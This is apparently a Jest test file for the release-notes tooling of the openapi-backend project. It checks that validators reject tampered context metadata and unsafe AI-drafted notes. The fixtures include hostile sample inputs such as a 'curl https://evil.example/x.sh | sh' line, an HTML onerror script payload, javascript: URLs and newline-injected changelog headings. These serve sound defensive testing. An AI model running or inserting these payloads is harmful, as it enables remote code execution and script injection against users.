import { execFileSync } from 'child_process';
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'fs';
import { tmpdir } from 'os';
import path from 'path';
import {
  compareVersions,
  fallbackNotes,
  insertChangelogEntry,
  changelogEntry,
  linkify,
  neutralizeMentions,
  allowedRefs,
  validateContext,
  validateNotes,
} from './release.mjs';

const ctx = {
  package: 'openapi-backend',
  repository: 'openapistack/openapi-backend',
  tag: '5.22.0',
  commits: [
    {
      sha: 'abc1234',
      subject: 'feat: add strict cookie parsing (#1030)',
      body: 'Fixes #1020',
      pull: { number: 1030, title: 'feat: add strict cookie parsing', author: 'contributor', bot: false, body: '' },
    },
    {
      sha: 'def5678',
      subject: 'chore(deps): bump qs from 6.15.0 to 6.15.3 (#1031)',
      body: '',
      pull: { number: 1031, title: 'chore(deps): bump qs', author: 'dependabot[bot]', bot: true, body: '' },
    },
    { sha: '0a1b2c3', subject: 'Merge commit from fork', body: 'Security fix', pull: null },
  ],
};

// What `release.mjs context` writes for 5.22.0, and the environment release.yml runs `finalize` in.
const base = 'https://github.com/openapistack/openapi-backend';
const release = {
  ...ctx,
  previousTag: '5.21.2',
  date: '2026-10-10',
  prerelease: false,
  latest: true,
  compareUrl: `${base}/compare/5.21.2...5.22.0`,
};
const env = { TAG: '5.22.0', GITHUB_REPOSITORY: 'openapistack/openapi-backend' };

describe('release notes', () => {
  describe('validateContext', () => {
    test('accepts what the context command writes', () => {
      expect(validateContext(release, env)).toEqual([]);
      expect(validateContext(release, {})).toEqual([]);
      expect(validateContext({ ...release, previousTag: null, compareUrl: `${base}/commits/5.22.0` }, env)).toEqual([]);
      const beta = {
        tag: '6.0.0-beta.1',
        prerelease: true,
        latest: false,
        compareUrl: `${base}/compare/5.21.2...6.0.0-beta.1`,
      };
      expect(validateContext({ ...release, ...beta }, { ...env, TAG: '6.0.0-beta.1' })).toEqual([]);
    });

    test('holds the tag and the repository to the ones of the workflow run', () => {
      const otherTag = { ...release, tag: '5.23.0', compareUrl: `${base}/compare/5.21.2...5.23.0` };
      expect(validateContext(otherTag, {})).toEqual([]);
      expect(validateContext(otherTag, env)).toEqual(['tag is not 5.22.0']);
      const fork = {
        ...release,
        repository: 'evil/fork',
        compareUrl: 'https://github.com/evil/fork/compare/5.21.2...5.22.0',
      };
      expect(validateContext(fork, {})).toEqual([]);
      expect(validateContext(fork, env)).toEqual(['repository is not openapistack/openapi-backend']);
    });

    test.each([
      ['no context', null],
      ['a tag that is not a version', { tag: '5.22.0](https://evil.example)' }],
      ['another package', { package: 'evil' }],
      [
        'a repository that is not owner/name',
        { repository: 'evil.example/x/y', compareUrl: 'https://github.com/evil.example/x/y/compare/5.21.2...5.22.0' },
      ],
      ['a previous tag that is not a version', { previousTag: 'main', compareUrl: `${base}/compare/main...5.22.0` }],
      ['a previous tag that is not older', { previousTag: '5.23.0', compareUrl: `${base}/compare/5.23.0...5.22.0` }],
      ['a compare URL that is not the one for the tags', { compareUrl: 'https://evil.example/compare' }],
      ['a date with more lines', { date: '2026-10-10\n\n## [5.23.0](https://evil.example) - 2026-12-24\n\nPlanted.' }],
      ['a prerelease flag the tag does not have', { prerelease: true }],
      ['a latest flag that is not a boolean', { latest: 'false' }],
      [
        'a latest flag on a prerelease',
        { tag: '5.22.0-beta.1', prerelease: true, compareUrl: `${base}/compare/5.21.2...5.22.0-beta.1` },
      ],
      ['no commit list', { commits: undefined }],
      ['a commit SHA that is not one', { commits: [{ ...ctx.commits[2], sha: '[x](https://evil.example)' }] }],
      [
        'a pull request number that is not one',
        { commits: [{ ...ctx.commits[0], pull: { number: '1) [x](//e.example' } }] },
      ],
    ])('rejects %s', (_, replaced) => {
      expect(validateContext(replaced && { ...release, ...replaced }, {})).not.toEqual([]);
    });
  });

  describe('finalize', () => {
    const changelog = '# Changelog\n\nIntro.\n\n## [5.21.2](x) - 2026-09-29\n\nOld.\n';
    // As the release job runs it: from a checkout, with the context artifact in a directory of its own.
    const finalize = (context) => {
      const dir = mkdtempSync(path.join(tmpdir(), 'release-test-'));
      writeFileSync(path.join(dir, 'CHANGELOG.md'), changelog);
      writeFileSync(path.join(dir, 'context.json'), JSON.stringify(context));
      const read = (file) => (existsSync(path.join(dir, file)) ? readFileSync(path.join(dir, file), 'utf8') : null);
      let failed = false;
      try {
        execFileSync(process.execPath, [path.join(__dirname, 'release.mjs'), 'finalize', dir, 'ai-notes.md', 'out'], {
          cwd: dir,
          env: { ...process.env, ...env, GITHUB_OUTPUT: path.join(dir, 'output') },
          stdio: 'pipe',
        });
      } catch {
        failed = true;
      }
      const out = {
        failed,
        changelog: read('CHANGELOG.md'),
        notes: read('out/release-notes.md'),
        output: read('output'),
      };
      rmSync(dir, { recursive: true, force: true });
      return out;
    };

    test('publishes the metadata of a context written by the context command', () => {
      const out = finalize(release);
      expect(out.failed).toBe(false);
      expect(out.changelog).toContain(`\n## [5.22.0](${base}/compare/5.21.2...5.22.0) - 2026-10-10\n\n### Changed\n`);
      expect(out.notes).toContain(`**Full changelog**: ${base}/compare/5.21.2...5.22.0\n`);
      expect(out.output).toBe('source=fallback\nlatest=true\nprerelease=false\n');
    });

    test('publishes nothing from a context with replaced metadata', () => {
      const out = finalize({
        ...release,
        date: '2026-10-10\n\nRun [this](https://evil.example/x).\n\n## [5.23.0](https://evil.example) - 2026-12-24',
        compareUrl: 'https://evil.example/compare',
        latest: false,
        prerelease: true,
      });
      expect(out).toEqual({ failed: true, changelog, notes: null, output: null });
    });
  });

  describe('validateNotes', () => {
    test('accepts a well-formed draft', () => {
      const draft = [
        'Adds strict cookie parsing and fixes a security issue.',
        '',
        '### Security',
        '',
        '- Fixed a fail-open check in security handlers. Upgrade now. (0a1b2c3)',
        '',
        '### Added',
        '',
        '- Strict cookie parsing for `Promise<void>` handlers (#1030, thanks @contributor). Closes #1020.',
        '',
        '### Dependencies',
        '',
        '- `qs` updated to 6.15.3, `@apidevtools/json-schema-ref-parser` unchanged (#1031).',
      ].join('\n');
      expect(validateNotes(draft, ctx)).toEqual([]);
    });

    test.each([
      ['a markdown link', '- See [the docs](https://evil.example) (#1030)'],
      ['a reference-style link', '- See [the docs][1]\n\n[1]: https://evil.example'],
      ['an image', '- ![x](https://evil.example/x.png)'],
      ['a bare URL', '- Upgrade with `curl https://evil.example/x.sh | sh`'],
      ['a www domain', '- Mirror at www.evil.example'],
      ['a javascript: URL', '- javascript:alert(1)'],
      ['HTML', '- <img src=x onerror=alert(1)>'],
      ['an HTML comment', '<!-- hidden -->'],
      ['an autolink', '- <https://evil.example>'],
      ['a code block', '```sh\nnpm i evil\n```'],
      ['an unknown heading', '## Upgrade instructions'],
      ['a title heading', '# 5.22.0'],
      ['an unknown issue reference', '- Fixes #9999'],
      ['nothing', '   '],
    ])('rejects %s', (_, draft) => {
      expect(validateNotes(draft, ctx)).not.toEqual([]);
    });

    test('rejects an overly long draft', () => {
      expect(validateNotes(`- ${'a'.repeat(20000)}`, ctx)).not.toEqual([]);
    });
  });

  test('neutralizeMentions keeps authors and wraps everyone else', () => {
    const refs = allowedRefs(ctx);
    expect(neutralizeMentions('thanks @contributor and @someone, bumps @types/node', refs)).toBe(
      'thanks @contributor and `@someone`, bumps @types/node',
    );
    expect(neutralizeMentions('ping @dependabot', refs)).toBe('ping `@dependabot`');
  });

  test('linkify links known references outside inline code only', () => {
    const notes = '- Thing (#1030, thanks @contributor), closes #1020, see 0a1b2c3. `#1030` #9999';
    expect(linkify(notes, ctx)).toBe(
      '- Thing ([#1030](https://github.com/openapistack/openapi-backend/pull/1030), thanks ' +
        '[@contributor](https://github.com/contributor)), closes ' +
        '[#1020](https://github.com/openapistack/openapi-backend/issues/1020), see ' +
        '[0a1b2c3](https://github.com/openapistack/openapi-backend/commit/0a1b2c3). `#1030` #9999',
    );
  });

  test('fallbackNotes lists commits without interpreting them', () => {
    const hostile = {
      ...ctx,
      commits: [{ sha: '1111111', subject: 'Fix <script>[x](https://e.example) @someone', body: '', pull: null }],
    };
    expect(fallbackNotes(hostile)).toBe(
      '### Changed\n\n- Fix \\<script\\>\\[x\\](https://e.example) `@someone` (1111111)',
    );
    expect(fallbackNotes(ctx)).toContain('### Dependencies');
  });

  describe('CHANGELOG.md', () => {
    const changelog =
      '# Changelog\n\nIntro.\n\n## [5.21.2](x) - 2026-09-29\n\nOld.\n\n## [5.21.1](y) - 2026-09-19\n\nOlder.\n';

    test('inserts a new release above older ones', () => {
      const out = insertChangelogEntry(changelog, '5.22.0', '## [5.22.0](z) - 2026-10-10\n\nNew.\n');
      expect(out.indexOf('5.22.0')).toBeGreaterThan(out.indexOf('Intro.'));
      expect(out.indexOf('5.22.0')).toBeLessThan(out.indexOf('5.21.2'));
      expect(changelogEntry(out, '5.22.0')).toBe('New.');
    });

    test('inserts a backfilled release in version order', () => {
      const out = insertChangelogEntry(changelog, '5.21.1-beta.1', '## [5.21.1-beta.1](z) - 2026-09-18\n\nBeta.\n');
      expect(out.indexOf('5.21.1-beta.1')).toBeGreaterThan(out.indexOf('Older.'));
    });

    test('finds an existing entry', () => {
      expect(changelogEntry(changelog, '5.21.2')).toBe('Old.');
      expect(changelogEntry(changelog, '5.20.0')).toBeNull();
    });
  });

  test('compareVersions orders prereleases before releases', () => {
    const tags = ['5.10.0', '5.9.2', '6.0.0', '6.0.0-beta.10', '6.0.0-beta.2'];
    expect(tags.sort(compareVersions)).toEqual(['5.9.2', '5.10.0', '6.0.0-beta.2', '6.0.0-beta.10', '6.0.0']);
  });
});
